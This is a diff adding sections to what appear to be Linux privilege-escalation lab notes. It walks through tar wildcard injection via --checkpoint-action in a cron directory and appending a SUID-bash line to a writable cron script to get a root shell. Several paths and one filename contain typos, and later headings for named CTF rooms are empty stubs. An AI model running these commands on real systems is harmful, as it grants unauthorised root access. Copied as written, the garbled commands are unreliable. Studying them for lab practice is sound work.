@@ -299,3 +299,96 @@ ls -la /tmp
 ```
 
 ![alt text](image-51.png)
+
+## Escalation via wildcard (*)
+
+1. Check file on crojob
+
+```bash
+cat /user/local/bin/compress.sh
+```
+
+![alt text](image-52.png)
+
+2. Check file permission
+
+```bash
+ls -la /user/local/bin/compress.sh
+```
+
+![alt text](image-53.png)
+* file cannot be write
+
+3. Write code injection file
+
+```bash
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > runme.sh
+chmod +x runme.sh
+```
+
+4. Exploit by using the file created
+
+```bash
+touch /home/user/--checkpoint=1
+touch /home/user/--checkpoint-action=exec=sh\runme.sh
+```
+
+5. Get root
+
+```bash
+/tmp/bash -p
+```
+
+![alt text](image-54.png)
+
+## Escalation via Cron File Overwrites
+
+1. Check file on crojob
+
+```bash
+cat /user/local/bin/overwrite.sh
+```
+
+![alt text](image-52.png)
+
+2. Check file permission
+
+```bash
+ls -la /user/local/bin/overwrite.sh
+```
+
+![alt text](image-55.png)
+
+3. Overwrite the file
+
+```bash
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh
+```
+
+4. Wait for the cronjob execute the file and Exploit
+
+![alt text](image-56.png)
+
+## Challenge Hacktivies (CMesS)
+
+1. Subdomain Enumeration
+
+![alt text](image-59.png)
+
+### Overview & Escalation via NFS Root Squashing
+
+
+
+### CApstone
+
+
+## LazyAdmin
+
+![alt text](image-60.png)
+
+## Anonymous
+1. Nmap
+![alt text](image-61.png)
+
+
+
